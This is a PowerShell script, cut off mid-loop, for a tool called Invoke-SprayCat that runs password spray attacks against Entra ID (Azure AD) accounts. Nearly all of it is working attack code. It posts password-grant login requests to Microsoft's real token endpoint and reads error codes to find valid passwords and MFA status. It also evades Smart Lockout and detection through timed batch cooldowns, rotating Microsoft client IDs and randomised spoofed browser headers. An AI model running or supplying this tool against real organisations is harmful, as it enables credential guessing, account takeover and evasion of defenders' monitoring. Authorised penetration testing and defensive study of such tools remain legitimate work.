#Requires -Version 5.1

function Invoke-SprayCat {
    <#
    .SYNOPSIS
        Performs password spray attacks against Entra ID with Smart Lockout evasion.

    .DESCRIPTION
        Invoke-SprayCat is a horizontal password spray tool designed for Entra ID (Azure AD) 
        penetration testing. It uses Smart Lockout evasion techniques including configurable 
        delays, multi-application rotation, and horizontal spray methodology to minimize 
        account lockouts while identifying valid credentials.

    .PARAMETER UserListFile
        Path to a text file containing target usernames (one per line).
        Supports standard UPN format (user@domain.com) and external guest format.

    .PARAMETER PasswordListFile
        Path to a text file containing passwords to test (one per line).

    .PARAMETER MaxFailures
        Maximum number of failed attempts before stopping. Default is 100.

    .PARAMETER DelayBetweenAttempts
        Seconds to wait between password spray rounds. Default 30, recommended 1800-3600
        for Smart Lockout evasion.

    .PARAMETER DelayBetweenUsers
        Seconds to wait between each user attempt. Default is 5.

    .PARAMETER BatchSize
        Number of users to spray before triggering a batch cooldown. Default is 25.
        Azure Smart Lockout tracks failed attempts per IP across all accounts.
        After ~40 attempts from the same IP, Azure flags the IP as suspicious.
        Batching with cooldowns allows IP reputation to reset.

    .PARAMETER BatchCooldown
        Seconds to wait between batches for IP reputation reset. Default is 300 (5 min).
        This is the key to avoiding IP-based lockouts. Azure's observation window
        resets after a period of inactivity from the source IP.

    .PARAMETER NoDelay
        Skip delays between attempts. Use with caution - increases lockout risk.

    .PARAMETER ObservationMode
        Skip inter-round delays for testing purposes only.

    .PARAMETER ContinueOnTenantError
        Continue spraying even if tenant errors occur for some users.

    .OUTPUTS
        System.Collections.Hashtable
        Returns a hashtable containing spray results and statistics.

    .EXAMPLE
        Invoke-SprayCat -UserListFile users.txt -PasswordListFile passwords.txt
        
        Performs a basic password spray with default batch settings (25 users, 5min cooldown).

    .EXAMPLE
        Invoke-SprayCat -UserListFile users.txt -PasswordListFile passwords.txt -BatchSize 20 -BatchCooldown 600
        
        Conservative spray: 20 users per batch with 10-minute cooldowns for maximum stealth.

    .EXAMPLE
        Invoke-SprayCat -UserListFile users.txt -PasswordListFile passwords.txt -DelayBetweenAttempts 1800
        
        Performs a stealth spray with 30-minute delays between password rounds.

    .NOTES
        Author: BlackCat Security Tools
        Requires: PowerShell 5.1+
        Warning: Use only with proper authorization. Unauthorized access attempts are illegal.

    .LINK
        https://github.com/azurekid/blackcat
    #>
    [CmdletBinding()]
    [OutputType([hashtable])]
    param (
        [Parameter(Mandatory)][string]$UserListFile,
        [Parameter(Mandatory)][string]$PasswordListFile,
        [int]$MaxFailures = 100,
        [ValidateRange(1, 3600)][int]$DelayBetweenAttempts = 30,
        [ValidateRange(0, 1800)][int]$DelayBetweenUsers = 5,
        [ValidateRange(5, 100)][int]$BatchSize = 25,
        [ValidateRange(60, 7200)][int]$BatchCooldown = 300,
        [switch]$NoDelay,
        [switch]$ObservationMode,
        [switch]$ContinueOnTenantError
    )

    begin {
        $script:Config = @{
            Logo = @"

╔══════════════════════════════════════════════════════════════════════════╗
║                                                                          ║
║   ███████╗██████╗ ██████╗  █████╗ ██╗   ██╗     ██████╗ █████╗ ████████╗ ║
║   ██╔════╝██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝    ██╔════╝██╔══██╗╚══██╔══╝ ║
║   ███████╗██████╔╝██████╔╝███████║ ╚████╔╝     ██║     ███████║   ██║    ║
║   ╚════██║██╔═══╝ ██╔══██╗██╔══██║  ╚██╔╝      ██║     ██╔══██║   ██║    ║
║   ███████║██║     ██║  ██║██║  ██║   ██║       ╚██████╗██║  ██║   ██║    ║
║   ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝        ╚═════╝╚═╝  ╚═╝   ╚═╝    ║
║                                                                          ║
║                 🐾  ENTRA ID PASSWORD SPRAY TOOL  🐾                     ║
║                                                                          ║
║            /\_/\          Smart Lockout Evasion                          ║
║           ( o.o )         Horizontal Spray Methodology                   ║
║            > ^ <          MFA Detection & Reporting                      ║
║           /|   |\         AADSTS Error Intelligence                      ║
║          (_|   |_)        CSV Export & Analytics                         ║
║                                                                          ║
║      [+] Stealth Mode    [+] Multi-App Rotation    [+] Smart Delays      ║
║                                                                          ║
╚══════════════════════════════════════════════════════════════════════════╝
"@
            LockoutThreshold = 3
            DefaultBatchSize = 25
            DefaultBatchCooldown = 300  # 5 minutes - allows IP reputation to reset
            DefaultApp = @{ Name = 'Azure PowerShell'; ClientId = '1950a258-227b-4e31-a9cf-717495945fc2'; Resource = 'https://graph.microsoft.com' }
            AuthEndpoint = 'https://login.microsoftonline.com/{0}/oauth2/token'
        }

        # AADSTS error code lookup hashtable
        $script:ErrorCodeMap = @{
            'AADSTS50076' = @{ Category = 'ValidCredentials_MFARequired'; Action = 'Success'; Message = 'Valid credentials - MFA required' }
            'AADSTS50079' = @{ Category = 'ValidCredentials_MFARequired'; Action = 'Success'; Message = 'Valid credentials - MFA interaction required' }
            'AADSTS50074' = @{ Category = 'ValidCredentials_MFARequired'; Action = 'Success'; Message = 'Valid credentials - Strong auth required' }
            'AADSTS50158' = @{ Category = 'ValidCredentials_ConditionalAccess'; Action = 'Success'; Message = 'Valid credentials - Conditional Access' }
            'AADSTS50055' = @{ Category = 'ValidCredentials_PasswordExpired'; Action = 'Success'; Message = 'Valid credentials - Password expired' }
            'AADSTS50144' = @{ Category = 'ValidCredentials_PasswordExpired'; Action = 'Success'; Message = 'Valid credentials - AD password expired' }
            'AADSTS50126' = @{ Category = 'InvalidCredentials'; Action = 'Continue'; Message = 'Invalid username or password' }
            'AADSTS50053' = @{ Category = 'AccountLocked'; Action = 'Pause'; Message = 'Account locked - Smart Lockout' }
            'AADSTS50057' = @{ Category = 'AccountDisabled'; Action = 'Continue'; Message = 'Account is disabled' }
            'AADSTS50034' = @{ Category = 'UserNotFound'; Action = 'Continue'; Message = 'User not found in tenant' }
            'AADSTS81016' = @{ Category = 'ConditionalAccessBlocked'; Action = 'Continue'; Message = 'CA policy blocking' }
            'AADSTS53003' = @{ Category = 'ConditionalAccessBlocked'; Action = 'Continue'; Message = 'CA access blocked' }
            'AADSTS53000' = @{ Category = 'ConditionalAccessBlocked'; Action = 'Continue'; Message = 'Device not compliant' }
            'AADSTS530034' = @{ Category = 'ConditionalAccessBlocked'; Action = 'Continue'; Message = 'Location blocked' }
            'AADSTS50128' = @{ Category = 'TenantNotFound'; Action = 'Stop'; Message = 'Tenant not found' }
            'AADSTS50059' = @{ Category = 'TenantNotFound'; Action = 'Stop'; Message = 'No tenant info' }
            'AADSTS90002' = @{ Category = 'TenantNotFound'; Action = 'Stop'; Message = 'Invalid tenant' }
            'AADSTS50196' = @{ Category = 'Throttled'; Action = 'Throttle'; Message = 'Server throttled' }
            'AADSTS700016' = @{ Category = 'ApplicationError'; Action = 'Stop'; Message = 'App not found' }
            'AADSTS700082' = @{ Category = 'SessionExpired'; Action = 'Continue'; Message = 'Refresh token expired' }
            'AADSTS50072' = @{ Category = 'InteractionRequired'; Action                 = 'Continue'; Message = 'User interaction required' }
            'AADSTS90072' = @{ Category = 'AccountNotEnabled'; Action = 'Continue'; Message = 'Account not fully enabled' }
            'AADSTS50173' = @{ Category = 'TokenExpired'; Action = 'Continue'; Message = 'Grant has expired' }
            'AADSTS65001' = @{ Category = 'UserCancelled'; Action = 'Continue'; Message = 'User cancelled auth' }
            'AADSTS50020' = @{ Category = 'UserUnauthorized'; Action = 'Continue'; Message = 'User unauthorized for app' }
        }

        # Microsoft apps for rotation
        $script:MicrosoftApps = @(
            # Azure & Management
            @{ Name = 'Azure PowerShell'; ClientId = '1950a258-227b-4e31-a9cf-717495945fc2'; Resource = 'https://graph.microsoft.com' }
            @{ Name = 'Azure CLI'; ClientId = '04b07795-8ddb-461a-bbee-02f9e1bf7b46'; Resource = 'https://management.azure.com' }
            @{ Name = 'Azure Portal'; ClientId = 'c44b4083-3bb0-49c1-b47d-974e53cbdf3c'; Resource = 'https://management.azure.com' }
            @{ Name = 'Azure AD PS'; ClientId = '1b730954-1685-4b74-9bfd-dac224a7b894'; Resource = 'https://graph.windows.net' }
            @{ Name = 'Graph PS'; ClientId = '14d82eec-204b-4c2f-b7e8-296a70dab67e'; Resource = 'https://graph.microsoft.com' }
            @{ Name = 'Visual Studio'; ClientId = '872cd9fa-d31f-45e0-9eab-6e460a02d1f1'; Resource = 'https://management.azure.com' }
            @{ Name = 'VS Code'; ClientId = 'aebc6443-996d-45c2-90f0-388ff96faa56'; Resource = 'https://management.azure.com' }
            # Microsoft 365
            @{ Name = 'Microsoft Office'; ClientId = 'd3590ed6-52b3-4102-aeff-aad2292ab01c'; Resource = 'https://graph.microsoft.com' }
            @{ Name = 'Microsoft Teams'; ClientId = '1fec8e78-bce4-4aaf-ab1b-5451cc387264'; Resource = 'https://graph.microsoft.com' }
            @{ Name = 'OneDrive'; ClientId = 'ab9b8c07-8f02-4f72-87fa-80105867a763'; Resource = 'https://graph.microsoft.com' }
            @{ Name = 'Outlook Mobile'; ClientId = '27922004-5251-4030-b22d-91ecd9a37ea4'; Resource = 'https://graph.microsoft.com' }
            @{ Name = 'SharePoint'; ClientId       = '00000003-0000-0ff1-ce00-000000000000'; Resource = 'https://graph.microsoft.com' }
            @{ Name = 'Word'; ClientId             = '26a7ee05-5602-4d76-a7ba-eae8b7b67941'; Resource = 'https://graph.microsoft.com' }
            @{ Name = 'Excel'; ClientId            = '57fb890c-0dab-4253-a5e0-7188c88b2bb4'; Resource = 'https://graph.microsoft.com' }
            @{ Name = 'PowerPoint'; ClientId       = 'b569f659-d618-4736-9ef4-7d37fc7f5f38'; Resource = 'https://graph.microsoft.com' }
            # Mobile & Auth
            @{ Name = 'Authenticator'; ClientId = '4813382a-8fa7-425e-ab75-3b753aab3abb'; Resource = 'https://graph.microsoft.com' }
            @{ Name = 'Company Portal'; ClientId = '9ba1a5c7-f17a-4de9-a1f1-6178c8d51223'; Resource = 'https://graph.microsoft.com' }
            @{ Name = 'Intune'; ClientId = 'd4ebce55-015a-49b5-a083-c84d1797ae8c'; Resource = 'https://graph.microsoft.com' }
            # Windows
            @{ Name = 'Windows Login'; ClientId = '38aa3b87-a06d-4817-b275-7a316988d93b'; Resource = 'https://graph.microsoft.com' }
            @{ Name = 'Windows Store'; ClientId = '45a330b1-b1ec-4cc1-9161-9f03992aa49f'; Resource = 'https://graph.microsoft.com' }
            # Power Platform
            @{ Name = 'Power BI'; ClientId = '871c010f-5e61-4fb1-83ac-98610a7e9110'; Resource = 'https://graph.microsoft.com' }
            @{ Name = 'Power Automate'; ClientId = '6cb51622-aa23-4166-bb3c-8d3b2c6dcb3b'; Resource = 'https://graph.microsoft.com' }
            @{ Name = 'Power Apps'; ClientId = '4e291c71-d680-4d0e-9640-0a3358a5e4cb'; Resource = 'https://graph.microsoft.com' }
            # Dynamics
            @{ Name = 'Dynamics CRM'; ClientId   = '00000007-0000-0000-c000-000000000000'; Resource = 'https://graph.microsoft.com' }
        )

        # User agents for traffic
        $script:UserAgents = @(
            # Windows - Chrome
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
            'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            # Windows - Edge
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0'
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'
            # Windows - Firefox
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0'
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0'
            # macOS - Chrome
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            # macOS - Safari
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15'
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15'
            # macOS - Firefox
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0'
            # iOS - Safari
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1'
            'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1'
            # Android - Chrome
            'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
            'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
            # Linux
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0'
        )

        # Accept-Language variations
        $script:AcceptLanguages = @(
            'en-US,en;q=0.9'
            'en-GB,en;q=0.9,en-US;q=0.8'
            'en-US,en;q=0.9,nl;q=0.8'
            'nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7'
            'de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7'
            'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'
            'es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7'
            'en-AU,en;q=0.9,en-US;q=0.8'
            'en-CA,en;q=0.9,en-US;q=0.8,fr-CA;q=0.7'
            'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
            'it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7'
            'ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7'
        )

        # Category display formatting hashtable
        $script:CategoryDisplay = @{
            'ValidCredentials_MFARequired' = @{ Label = '[+] VALID PASSWORD'; Color = 'Yellow'; Suffix = ' → MFA REQUIRED' }
            'ValidCredentials_PasswordExpired' = @{ Label = '[+] VALID PASSWORD'; Color = 'Yellow'; Suffix = ' → PASSWORD EXPIRED' }
            'ValidCredentials_ConditionalAccess' = @{ Label = '[+] VALID PASSWORD'; Color = 'Yellow'; Suffix = ' → CONDITIONAL ACCESS' }
            'Success' = @{ Label = '[+] FULL ACCESS'; Color = 'Green'; Suffix = ''; ShowToken = $true }
            'AccountLocked' = @{ Label = '[!] LOCKED'; Color = 'Red' }
            'AccountDisabled' = @{ Label = '[!] DISABLED'; Color = 'Yellow' }
            'ConditionalAccessBlocked' = @{ Label = '[!] BLOCKED'; Color = 'Yellow' }
            'TenantNotFound' = @{ Label = '[!] TENANT ERROR'; Color = 'Red'; ShowCode = $true }
            'Throttled' = @{ Label = '[!] THROTTLED'; Color = 'Yellow' }
        }

        # Stats counter categories to track
        $script:StatCounters = @{
            'InvalidCredentials' = 'InvalidCredentials'
            'AccountLocked' = 'AccountLocked'
            'AccountDisabled' = 'AccountDisabled'
            'UserNotFound' = 'UserNotFound'
            'TenantNotFound' = 'TenantNotFound'
            'ConditionalAccessBlocked' = 'ConditionalAccessBlocked'
            'Throttled' = 'Throttled'
        }

        # Message type formatting
        $script:MsgTypes = @{
            Info     = @{ Prefix = '[*]'; Color = 'Cyan' }
            Success  = @{ Prefix = '[+]'; Color = 'Green' }
            Warning  = @{ Prefix = '[!]'; Color = 'Yellow' }
            Error    = @{ Prefix = '[!!]'; Color = 'Red' }
            Detail   = @{ Prefix = '   '; Color = 'DarkGray' }
            Timer    = @{ Prefix = '[⏱]'; Color = 'DarkGray' }
        }

        Write-Host $script:Config.Logo -ForegroundColor Blue
        Import-Module Microsoft.Graph.Authentication -ErrorAction SilentlyContinue

        #region Helper Functions - Output
        
        function Write-Log {
            param(
                [string]$Message,
                [ValidateSet('Info','Success','Warning','Error','Detail','Timer')][string]$Type = 'Info',
                [switch]$NoPrefix,
                [switch]$NoNewline
            )
            $fmt = $script:MsgTypes[$Type]
            $text = if ($NoPrefix) { $Message } else { "$($fmt.Prefix) $Message" }
            $params = @{ Object = $text; ForegroundColor = $fmt.Color; NoNewline = $NoNewline }
            Write-Host @params
        }

        function Write-Banner {
            param([string]$Title, [string]$Color = 'Cyan')
            $width = 64
            $padding = [Math]::Max(0, ($width - $Title.Length - 2) / 2)
            $line = "═" * $width
            Write-Host "`n╔$line╗" -ForegroundColor $Color
            Write-Host "║$(' ' * [Math]::Floor($padding))$Title$(' ' * [Math]::Ceiling($padding))  ║" -ForegroundColor $Color
            Write-Host "╚$line╝`n" -ForegroundColor $Color
        }

        function Show-Result {
            param([hashtable]$Params)
            $fmt = $script:CategoryDisplay[$Params.Category]
            if (-not $fmt) { Write-Verbose "[-] $($Params.Category): $($Params.User)"; return }

            # Clear progress line before showing result
            Write-Host "`r$(' ' * 90)`r" -NoNewline
            
            $msg = "$($fmt.Label): $($Params.User)" + $(if ($Params.Password) { " : $($Params.Password)" }) + ($fmt.Suffix ?? '')
            Write-Host $msg -ForegroundColor $fmt.Color
            
            if ($Params.Category -match '^ValidCredentials|^Success') {
                Write-Log "$($Params.Details.Message) | $($Params.App.Name)" -Type Detail
                if ($fmt.ShowToken) { Write-Log "Access Token: Acquired" -Type Detail }
            }
            if ($fmt.ShowCode -and $Params.Details.ErrorCode) {
                Write-Log "$($Params.Details.ErrorCode): $($Params.Details.Message)" -Type Detail
            }
        }

        #endregion

        #region Helper Functions - Initialization
        
        function Initialize-Stats {
            @{
                ValidCredentials = [System.Collections.Generic.List[PSObject]]::new()
                InvalidCredentials = 0; AccountLocked = 0; AccountDisabled = 0; UserNotFound = 0
                TenantNotFound = 0; ConditionalAccessBlocked = 0; Throttled = 0; UnknownErrors = 0
                TotalAttempts = 0; TenantsProcessed = @{}; ErrorsByCategory = @{}; ThrottleCount = 0
                SprayRounds = 0; StartTime = Get-Date; LockoutsByRound = @{}; ConsecutiveLockouts = 0
            }
        }

        #endregion

        #region Helper Functions - Input Processing
        
        function Convert-ExternalAccount {
            param([string]$Username)
            if ($Username -match '^(.+)_(.+)#EXT#@') { "$($matches[1])@$($matches[2])" } else { $Username }
        }

        function Get-UsersFromFile {
            <#
            .SYNOPSIS
                Extracts UserPrincipalNames from txt, csv, or json files automatically.
            #>
            param([string]$FilePath)
            
            $extension = [System.IO.Path]::GetExtension($FilePath).ToLower()
            $content = Get-Content $FilePath -Raw
            $users = @()
            
            # UPN regex pattern
            $upnPattern = '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
            
            switch ($extension) {
                '.json' {
                    try {
                        $json = $content | ConvertFrom-Json
                        # Handle array of objects or array of strings
                        if ($json -is [array]) {
                            foreach ($item in $json) {
                                if ($item -is [string]) {
                                    # Array of email strings
                                    if ($item -match $upnPattern) { $users += $matches[0] }
                                } else {
                                    # Array of objects - look for common UPN property names
                                    $upnProps = @('userPrincipalName', 'upn', 'email', 'mail', 'EmailAddress', 'username', 'user', 'UserName')
                                    foreach ($prop in $upnProps) {
                                        if ($item.$prop -and $item.$prop -match $upnPattern) {
                                            $users += $matches[0]
                                            break
                                        }
                                    }
                                }
                            }
                        } elseif ($json.value -is [array]) {
                            # Microsoft Graph style response with .value array
                            foreach ($item in $json.value) {
                                $upnProps = @('userPrincipalName', 'upn', 'email', 'mail', 'EmailAddress', 'username')
                                foreach ($prop in $upnProps) {
                                    if ($item.$prop -and $item.$prop -match $upnPattern) {
                                        $users += $matches[0]
                                        break
                                    }
                                }
                            }
                        }
                        Write-Log "Parsed JSON: Found $($users.Count) users" -Type Detail
                    } catch {
                        Write-Log "JSON parse failed, extracting UPNs via regex" -Type Warning
                        $users = [regex]::Matches($content, $upnPattern) | ForEach-Object { $_.Value }
                    }
                }
                '.csv' {
                    try {
                        $csv = $content | ConvertFrom-Csv
                        $upnProps = @('userPrincipalName', 'upn', 'email', 'mail', 'EmailAddress', 'username', 'user', 'UserName', 'User')
                        # Find which column contains UPNs
                        $headers = $csv[0].PSObject.Properties.Name
                        $upnColumn = $headers | Where-Object { $_ -in $upnProps } | Select-Object -First 1
                        
                        if ($upnColumn) {
                            $users = $csv | ForEach-Object { $_.$upnColumn } | Where-Object { $_ -match $upnPattern }
                            Write-Log "Parsed CSV column '$upnColumn': Found $($users.Count) users" -Type Detail
                        } else {
                            # No matching header - search all columns for UPNs
                            foreach ($row in $csv) {
                                foreach ($prop in $row.PSObject.Properties) {
                                    if ($prop.Value -match $upnPattern) {
                                        $users += $matches[0]
                                        break
                                    }
                                }
                            }
                            Write-Log "Parsed CSV (auto-detect): Found $($users.Count) users" -Type Detail
                        }
                    } catch {
                        Write-Log "CSV parse failed, extracting UPNs via regex" -Type Warning
                        $users = [regex]::Matches($content, $upnPattern) | ForEach-Object { $_.Value }
                    }
                }
                default {
                    # .txt or unknown - treat as line-delimited or extract all UPNs
                    $lines = Get-Content $FilePath
                    foreach ($line in $lines) {
                        if ($line -match "^$upnPattern$") {
                            # Line is just a UPN
                            $users += $line.Trim()
                        } elseif ($line -match $upnPattern) {
                            # Line contains a UPN somewhere
                            $users += $matches[0]
                        }
                    }
                    Write-Log "Parsed TXT: Found $($users.Count) users" -Type Detail
                }
            }
            
            # Deduplicate and return
            $users | Select-Object -Unique
        }

        #endregion

        #region Helper Functions - Request Building
        
        function Get-RandomHeaders {
            # Generate realistic browser headers to mimic legitimate traffic
            $correlationId = [guid]::NewGuid().ToString()
            
            @{
                'User-Agent'                = $script:UserAgents | Get-Random
                'Accept'                    = 'application/json, text/plain, */*'
                'Accept-Language'           = $script:AcceptLanguages | Get-Random
                'Accept-Encoding'           = 'gzip, deflate, br'
                'Cache-Control'             = 'no-cache'
                'Pragma'                    = 'no-cache'
                'Origin'                    = 'https://login.microsoftonline.com'
                'Referer'                   = 'https://login.microsoftonline.com/'
                'Sec-Fetch-Dest'            = 'empty'
                'Sec-Fetch-Mode'            = 'cors'
                'Sec-Fetch-Site'            = 'same-origin'
                'Sec-Ch-Ua'                 = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"'
                'Sec-Ch-Ua-Mobile'          = '?0'
                'Sec-Ch-Ua-Platform'        = @('"Windows"', '"macOS"', '"Linux"') | Get-Random
                'X-Ms-Client-Request-Id'    = $correlationId
                'Client-Request-Id'         = $correlationId
                'X-Client-Sku'              = 'MSAL.Desktop'
                'X-Client-Ver'              = '4.61.3.0'
                'X-Client-Os'               = @('Windows 10', 'Windows 11', 'MacOS', 'Linux') | Get-Random
                'Return-Client-Request-Id'  = 'true'
            }
        }

        #endregion

        #region Helper Functions - Error Handling
        
        function Get-ErrorDetails {
            param([hashtable]$Params)  # ErrorMessage, Username
            $code = if ($Params.ErrorMessage -match 'AADSTS(\d+)') { "AADSTS$($matches[1])" } else { $null }
            $map = $script:ErrorCodeMap[$code] ?? @{ Category = 'UnknownError'; Action = 'Continue'; Message = $Params.ErrorMessage }
            @{ ErrorCode = $code; Category = $map.Category; Action = $map.Action; Message = $map.Message; Username = $Params.Username; Timestamp = Get-Date }
        }

        #endregion

        #region Helper Functions - Core Authentication
        
        function Test-Credentials {
            param([hashtable]$Params)
            $result = @{ Success = $false; ErrorDetails = $null; Response = $null }
            
            # Extract tenant from username - take everything after @
            $tenantId = $Params.TenantId
            if (-not $tenantId -and $Params.Username -match '@(.+)$') {
                $tenantId = $matches[1]
            }
            if (-not $tenantId) {
                $result.ErrorDetails = Get-ErrorDetails -Params @{ ErrorMessage = 'No tenant'; Username = $Params.Username }
                return $result
            }

            $app = $Params.App ?? $script:Config.DefaultApp
            
            # Generate random headers for traffic legitimacy
            $headers = Get-RandomHeaders
            
            # Request parameters hashtable for splatting
            $requestParams = @{
                Uri = $script:Config.AuthEndpoint -f $tenantId
                Method = 'POST'
                Headers = $headers
                ContentType = 'application/x-www-form-urlencoded'
                TimeoutSec = 30
                ErrorAction = 'Stop'
                Body = "grant_type=password&client_id=$($app.ClientId)&resource=$($app.Resource)&username=$([uri]::EscapeDataString($Params.Username))&password=$([uri]::EscapeDataString($Params.Password))&scope=openid"
            }

            try {
                $response = Invoke-RestMethod @requestParams
                if ($response.access_token) {
                    $result.Success = $true
                    $result.Response = $response
                    $result.ErrorDetails = @{ ErrorCode = $null; Category = 'Success'; Action = 'Success'; Message = 'Full access granted'; Username = $Params.Username; Timestamp = Get-Date }
                }
            } catch {
                $errMsg = try { ($_.ErrorDetails.Message | ConvertFrom-Json).error_description } catch { $_.Exception.Message }
                $result.ErrorDetails = Get-ErrorDetails -Params @{ ErrorMessage = $errMsg; Username = $Params.Username }
            }
            $result
        }

        #endregion
    }
    
    process {
        try {
            # Validate inputs
            @($UserListFile, $PasswordListFile) | ForEach-Object { if (-not (Test-Path $_)) { throw "$_ not found" } }
            
            # Auto-detect file format and extract UPNs
            $rawUsers = Get-UsersFromFile -FilePath $UserListFile
            $users = $rawUsers | Get-Random -Count ([int]::MaxValue)
            $passwords = Get-Content $PasswordListFile | Where-Object { $_.Trim() -ne '' }

            # Display configuration
            $delayColors = @{ Short = 'Red'; Medium = 'Yellow'; Long = 'Green' }
            $delayLevel = if ($DelayBetweenAttempts -lt 60) { 'Short' } elseif ($DelayBetweenAttempts -lt 1800) { 'Medium' } else { 'Long' }
            
            Write-Banner "ENTRA ID PASSWORD SPRAY - CONFIGURATION   "
            Write-Log "Spray: HORIZONTAL (Batch Mode)" -Type Success
            Write-Log "Targets: $($users.Count) users × $($passwords.Count) passwords = $($users.Count * $passwords.Count) attempts"
            Write-Log "Batches: $BatchSize users per batch, ${BatchCooldown}s cooldown between batches"
            Write-Host "[*] Delays: ${DelayBetweenAttempts}s between rounds, ${DelayBetweenUsers}s between users" -ForegroundColor $delayColors[$delayLevel]
            
            $totalBatches = [Math]::Ceiling($users.Count / $BatchSize)
            Write-Log "IP Evasion: $totalBatches batches × $($passwords.Count) rounds = $(($totalBatches - 1) * $passwords.Count) cooldown periods"
            
            if ($delayLevel -eq 'Short') { Write-Log "WARNING: Short delays increase lockout risk!" -Type Error }
            Write-Log "Press Ctrl+C to abort`n" -Type Detail
            Start-Sleep -Seconds 2

            # Initialize stats and tracking
            $stats = Initialize-Stats
            $lockoutCount = 0
            $consecutiveThrottles = 0
            $consecutiveLockouts = 0

            foreach ($password in $passwords) {
                $stats.SprayRounds++
                Write-Log "═══ ROUND $($stats.SprayRounds)/$($passwords.Count) ═══"

                # Wait between rounds (with progress)
                if (-not $ObservationMode -and $stats.SprayRounds -gt 1) {
                    Write-Log "Waiting ${DelayBetweenAttempts}s (Smart Lockout evasion)..." -Type Warning
                    1..[Math]::Ceiling($DelayBetweenAttempts / 10) | ForEach-Object {
                        $remaining = $DelayBetweenAttempts - (($_ - 1) * 10)
                        Write-Log "${remaining}s remaining..." -Type Timer
                        Start-Sleep -Seconds ([Math]::Min(10, $remaining))
                    }
                }

                if ($lockoutCount -ge $script:Config.LockoutThreshold) {
                    Write-Log "STOPPING: Lockout threshold reached" -Type Error; break
                }

                $userIndex = 0
                $totalUsers = $users.Count
                $batchNumber = 0
                
                foreach ($user in $users) {
                    $userIndex++
                    
                    # Batch cooldown check - pause after every BatchSize users to let IP reputation reset
                    if ($userIndex -gt 1 -and (($userIndex - 1) % $BatchSize) -eq 0) {
                        $batchNumber++
                        Write-Host "`r$(' ' * 90)`r" -NoNewline
                        Write-Log "Batch $batchNumber complete. Cooling down ${BatchCooldown}s (IP reputation reset)..." -Type Warning
                        
                        # Reset consecutive lockout counter after cooldown
                        $consecutiveLockouts = 0
                        
                        # Cooldown with progress
                        $cooldownSteps = [Math]::Max(1, [Math]::Ceiling($BatchCooldown / 30))
                        1..$cooldownSteps | ForEach-Object {
                            $remaining = $BatchCooldown - (($_ - 1) * 30)
                            $pctCool = [Math]::Round(($_ / $cooldownSteps) * 100)
                            $coolBar = ('▓' * [Math]::Floor($pctCool / 5)) + ('░' * (20 - [Math]::Floor($pctCool / 5)))
                            Write-Host "`r    [$coolBar] ${remaining}s remaining...".PadRight(60) -NoNewline -ForegroundColor DarkYellow
                            Start-Sleep -Seconds ([Math]::Min(30, $remaining))
                        }
                        Write-Host "`r$(' ' * 90)`r" -NoNewline
                        Write-Log "Resuming spray..." -Type Info
                    }
                    
                    $normalizedUser = Convert-ExternalAccount -Username $user
                    $app = $script:MicrosoftApps | Get-Random
                    $stats.TotalAttempts++
                    
                    # Progress indicator
                    $pct = [Math]::Round(($userIndex / $totalUsers) * 100)
                    $progressBar = ('█' * [Math]::Floor($pct / 5)) + ('░' * (20 - [Math]::Floor($pct / 5)))
                    Write-Host "`r    [$progressBar] $pct% ($userIndex/$totalUsers) Testing: $($normalizedUser.Split('@')[0])...".PadRight(80) -NoNewline -ForegroundColor DarkGray

                    $credParams = @{ Username = $normalizedUser; Password = $password; App = $app }
                    $result = Test-Credentials -Params $credParams
                    $cat = $result.ErrorDetails.Category

